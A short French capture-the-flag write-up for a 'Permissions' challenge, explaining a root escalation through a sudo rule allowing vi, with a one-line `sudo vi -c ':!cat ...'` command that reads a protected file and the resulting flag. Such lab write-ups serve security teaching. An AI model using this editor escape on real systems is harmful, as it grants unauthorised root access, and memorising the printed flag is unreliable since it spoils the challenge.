# Permissions

**Catégorie** : General Skills · **Challenge** : #363 · **Résolu le** : 2026-11-23

## Énoncé

> —

## Résolution

Méthode : **sudo vi -> shell root**.

SSH en `picoplayer`, puis `sudo -l` montre `(ALL) /usr/bin/vi`. Escalade classique via l'editeur : `sudo vi -c ':!cat /challenge/metadata.json' -c ':q!' /dev/null`. Le fichier `metadata.json` contient le flag.

## Flag

```
academy{uS1ng_v1m_3dit0r_36d36e71}
```

## Ce qu'il faut retenir

—
